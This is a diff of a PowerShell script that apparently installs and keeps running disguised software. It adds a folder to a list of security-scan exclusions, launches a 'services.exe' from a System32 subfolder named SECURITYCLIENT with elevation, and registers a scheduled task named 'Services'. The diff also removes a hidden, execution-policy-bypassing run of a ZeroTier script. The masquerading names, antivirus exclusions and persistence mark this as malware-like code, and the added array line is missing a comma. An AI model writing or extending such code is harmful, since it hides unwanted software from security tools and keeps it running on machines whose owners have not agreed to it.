@@ -16,6 +16,7 @@ function Add-FolderExclusions {
     $foldersToExclude = @(
         "C:\Windows\System32\SubDirectory\",
         "C:\Windows\System32\SubDir",
+	"C:\Program Files\SubDir"
 	"C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\",
         "$env:APPDATA\SubDir"  # Dynamically gets the current user's AppData path
     )
@@ -149,10 +150,10 @@ Clone-GitHubRepo
 #Starting programs
 Start-Process -FilePath "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe" -Verb RunAs
 
+
 # Define variables
 $taskName = "Services"
 $xmlFilePath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\sch.xml"
-$psScriptPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\zerotier.ps1"
 
 # Retrieve current user and domain information dynamically
 $domain = $env:USERDOMAIN
@@ -164,7 +165,7 @@ if (!(Test-Path -Path $xmlDirectory)) {
     New-Item -ItemType Directory -Path $xmlDirectory -Force | Out-Null
 }
 
-# Define the XML content dynamically, including running the PowerShell script silently
+# Define the XML content dynamically
 $xmlContent = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -227,10 +228,6 @@ $xmlContent = @"
     <Exec>
       <Command>"C:\Program Files\SubDir\services.exe"</Command>
     </Exec>
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -File "$psScriptPath" -WindowStyle Hidden</Arguments>
-    </Exec>
   </Actions>
 </Task>
 "@
@@ -269,6 +266,5 @@ Try {
     Write-Error "Failed to retrieve scheduled task status: $_"
 }
 
+
 Write-Host "Script completed successfully." -ForegroundColor Green
-# Keep the window open
-Read-Host -Prompt "Press Enter to exit"
